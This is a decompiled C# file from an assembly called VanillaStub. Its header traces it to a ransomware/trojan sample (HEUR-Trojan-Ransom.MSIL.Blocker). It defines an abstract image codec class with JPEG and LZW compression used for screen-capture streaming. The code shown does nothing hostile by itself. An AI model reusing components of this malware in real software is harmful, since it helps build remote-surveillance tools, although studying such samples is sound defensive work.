// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.IUnsafeCodec
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using VanillaStub.Helpers.Services.StreamLibrary.src;

namespace VanillaStub.Helpers.Services.StreamLibrary
{
  public abstract class IUnsafeCodec
  {
    private int _imageQuality;
    protected JpgCompression jpgCompression;
    protected LzwCompression lzwCompression;

    public IUnsafeCodec(int ImageQuality = 100)
    {
      this.ImageQuality = ImageQuality;
      this.ImageProcessLock = new object();
    }

    public abstract ulong CachedSize { get; internal set; }

    protected object ImageProcessLock { get; }

    public int ImageQuality
    {
      get => this._imageQuality;
      set
      {
        this._imageQuality = value;
        this.jpgCompression = new JpgCompression(value);
        this.lzwCompression = new LzwCompression(value);
      }
    }

    public abstract int BufferCount { get; }

    public abstract CodecOption CodecOptions { get; }

    public abstract event IVideoCodec.VideoDebugScanningDelegate onCodeDebugScan;

    public abstract event IVideoCodec.VideoDebugScanningDelegate onDecodeDebugScan;

    public abstract void CodeImage(
      IntPtr Scan0,
      Rectangle ScanArea,
      Size ImageSize,
      PixelFormat Format,
      Stream outStream);

    public abstract Bitmap DecodeData(Stream inStream);

    public abstract Bitmap DecodeData(IntPtr CodecBuffer, uint Length);
  }
}
